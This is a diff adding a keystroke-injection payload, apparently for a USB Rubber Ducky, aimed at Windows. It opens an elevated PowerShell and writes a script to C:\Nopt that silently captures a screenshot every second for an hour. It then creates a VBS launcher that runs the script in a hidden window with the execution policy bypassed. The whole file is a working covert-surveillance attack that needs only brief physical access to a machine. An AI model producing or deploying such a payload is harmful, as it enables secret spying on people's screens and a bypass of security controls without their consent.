@@ -1,0 +1,97 @@
+REM Open Run dialog
+GUI r
+DELAY 500
+
+REM Open PowerShell as admin
+STRING powershell -Command "Start-Process powershell -Verb runAs"
+ENTER
+DELAY 1500
+
+REM Create folder C:\Nopt
+STRING New-Item -ItemType Directory -Path C:\Nopt -Force
+ENTER
+DELAY 500
+
+REM Write screenshot.ps1 line 1
+STRING Add-Content -Path C:\Nopt\screenshot.ps1 -Value '$screenshotsPath = "C:\Nopt\screenshots"'
+ENTER
+DELAY 500
+
+REM Write screenshot.ps1 line 2
+STRING Add-Content -Path C:\Nopt\screenshot.ps1 -Value 'if (-Not (Test-Path $screenshotsPath)) {New-Item -ItemType Directory -Path $screenshotsPath | Out-Null}'
+ENTER
+DELAY 500
+
+REM Write screenshot.ps1 line 3
+STRING Add-Content -Path C:\Nopt\screenshot.ps1 -Value '$stopFile = Join-Path $screenshotsPath "stop.txt"'
+ENTER
+DELAY 500
+
+REM Write screenshot.ps1 line 4
+STRING Add-Content -Path C:\Nopt\screenshot.ps1 -Value '$endTime = (Get-Date).AddHours(1)'
+ENTER
+DELAY 500
+
+REM Write screenshot.ps1 line 5
+STRING Add-Content -Path C:\Nopt\screenshot.ps1 -Value 'while ((Get-Date) -lt $endTime) {'
+ENTER
+DELAY 500
+
+REM Write screenshot.ps1 line 6
+STRING Add-Content -Path C:\Nopt\screenshot.ps1 -Value '    if (Test-Path $stopFile) { break }'
+ENTER
+DELAY 500
+
+REM Write screenshot.ps1 line 7
+STRING Add-Content -Path C:\Nopt\screenshot.ps1 -Value '    $bmp = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)'
+ENTER
+DELAY 500
+
+REM Write screenshot.ps1 line 8
+STRING Add-Content -Path C:\Nopt\screenshot.ps1 -Value '    $graphics = [System.Drawing.Graphics]::FromImage($bmp)'
+ENTER
+DELAY 500
+
+REM Write screenshot.ps1 line 9
+STRING Add-Content -Path C:\Nopt\screenshot.ps1 -Value '    $graphics.CopyFromScreen(0,0,0,0,$bmp.Size)'
+ENTER
+DELAY 500
+
+REM Write screenshot.ps1 line 10
+STRING Add-Content -Path C:\Nopt\screenshot.ps1 -Value '    $filename = Join-Path $screenshotsPath ("screenshot_" + (Get-Date -Format "yyyyMMdd_HHmmss") + ".png")'
+ENTER
+DELAY 500
+
+REM Write screenshot.ps1 line 11
+STRING Add-Content -Path C:\Nopt\screenshot.ps1 -Value '    $bmp.Save($filename, [System.Drawing.Imaging.ImageFormat]::Png)'
+ENTER
+DELAY 500
+
+REM Write screenshot.ps1 line 12
+STRING Add-Content -Path C:\Nopt\screenshot.ps1 -Value '    $graphics.Dispose()'
+ENTER
+DELAY 500
+
+REM Write screenshot.ps1 line 13
+STRING Add-Content -Path C:\Nopt\screenshot.ps1 -Value '    $bmp.Dispose()'
+ENTER
+DELAY 500
+
+REM Write screenshot.ps1 line 14
+STRING Add-Content -Path C:\Nopt\screenshot.ps1 -Value '    Start-Sleep -Seconds 1'
+ENTER
+DELAY 500
+
+REM Write screenshot.ps1 line 15
+STRING Add-Content -Path C:\Nopt\screenshot.ps1 -Value '}'
+ENTER
+DELAY 500
+
+REM Write start.vbs (single line)
+STRING Add-Content -Path C:\Nopt\start.vbs -Value 'Set objShell = CreateObject("Wscript.Shell") : objShell.Run("powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Nopt\screenshot.ps1"), 0, False'
+ENTER
+DELAY 500
+
+REM Run start.vbs silently
+STRING wscript.exe C:\Nopt\start.vbs
+ENTER
